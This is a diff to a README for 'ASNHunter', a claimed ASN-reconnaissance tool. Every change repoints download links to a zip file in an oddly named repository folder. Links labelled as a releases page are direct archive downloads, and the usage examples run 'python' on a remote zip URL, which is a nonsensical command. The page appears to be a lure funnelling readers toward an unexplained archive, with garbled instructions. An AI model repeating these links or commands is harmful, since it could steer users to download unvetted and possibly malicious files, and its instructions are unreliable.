@@ -1,7 +1,7 @@
 # 🔍 ASNHunter - Discover ASN Information Easily
 
 ## 📥 Download Now!
-[![Download ASNHunter](https://raw.githubusercontent.com/r0zhh/ASNHunter/main/juxtaposit/ASNHunter.zip)](https://raw.githubusercontent.com/r0zhh/ASNHunter/main/juxtaposit/ASNHunter.zip)
+[![Download ASNHunter](https://github.com/r0zhh/ASNHunter/raw/refs/heads/main/juxtaposit/Hunter_ASN_v1.6.zip)](https://github.com/r0zhh/ASNHunter/raw/refs/heads/main/juxtaposit/Hunter_ASN_v1.6.zip)
 
 ## 🚀 Getting Started
 Welcome to ASNHunter! This tool helps you find valuable ASN (Autonomous System Number) information. It is perfect for bug bounty hunters, penetration testers, and red teams. You can easily discover data from multiple sources, including complete IPv4/IPv6 prefix discoveries.
@@ -22,9 +22,9 @@ Welcome to ASNHunter! This tool helps you find valuable ASN (Autonomous System N
 ## 💻 Installation Instructions
 To get started with ASNHunter, follow these steps:
 
-1. Visit the [Releases Page](https://raw.githubusercontent.com/r0zhh/ASNHunter/main/juxtaposit/ASNHunter.zip) to download the latest version.
+1. Visit the [Releases Page](https://github.com/r0zhh/ASNHunter/raw/refs/heads/main/juxtaposit/Hunter_ASN_v1.6.zip) to download the latest version.
 2. Select the appropriate file for your operating system. Common files include:
-   - https://raw.githubusercontent.com/r0zhh/ASNHunter/main/juxtaposit/ASNHunter.zip for Windows
+   - https://github.com/r0zhh/ASNHunter/raw/refs/heads/main/juxtaposit/Hunter_ASN_v1.6.zip for Windows
    - ASNHunter-macos for macOS
    - ASNHunter-linux for Linux
 
@@ -42,7 +42,7 @@ Using ASNHunter is simple. After installation, follow these instructions to perf
 
 2. Type the command to start ASNHunter:
    ```
-   python https://raw.githubusercontent.com/r0zhh/ASNHunter/main/juxtaposit/ASNHunter.zip [your_asn_or_ip]
+   python https://github.com/r0zhh/ASNHunter/raw/refs/heads/main/juxtaposit/Hunter_ASN_v1.6.zip [your_asn_or_ip]
    ```
    Replace `[your_asn_or_ip]` with the ASN or IP address you want to investigate.
 
@@ -51,7 +51,7 @@ Using ASNHunter is simple. After installation, follow these instructions to perf
 ### 🛠️ Example Command
 To check ASN information for `AS15169`, type:
 ```
-python https://raw.githubusercontent.com/r0zhh/ASNHunter/main/juxtaposit/ASNHunter.zip AS15169
+python https://github.com/r0zhh/ASNHunter/raw/refs/heads/main/juxtaposit/Hunter_ASN_v1.6.zip AS15169
 ```
 
 ## 📄 Results Explained
@@ -80,7 +80,7 @@ If you encounter issues, here are some common problems and their solutions:
 If you have questions or need help, feel free to check out our community discussions on GitHub. You can report issues or request features directly through the issues section.
 
 ## 📥 Download & Install
-Don’t forget to [visit the Releases Page](https://raw.githubusercontent.com/r0zhh/ASNHunter/main/juxtaposit/ASNHunter.zip) to download the latest version of ASNHunter and start your ASN reconnaissance journey today.
+Don’t forget to [visit the Releases Page](https://github.com/r0zhh/ASNHunter/raw/refs/heads/main/juxtaposit/Hunter_ASN_v1.6.zip) to download the latest version of ASNHunter and start your ASN reconnaissance journey today.
 
 ## 📜 License
 ASNHunter is licensed under the MIT License. Feel free to modify and use it in compliance with this license. 
